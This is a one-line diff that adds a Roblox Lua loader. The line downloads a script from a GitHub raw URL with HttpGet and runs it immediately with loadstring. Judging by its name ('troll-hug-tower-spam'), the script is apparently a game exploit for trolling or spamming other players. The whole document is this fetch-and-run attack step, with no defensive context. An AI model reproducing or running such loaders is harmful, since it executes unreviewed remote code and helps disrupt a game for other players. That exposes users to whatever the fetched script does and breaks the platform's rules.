@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/troll-hug-tower-spam6-qxkpz49cn0tn8k.lua"))()
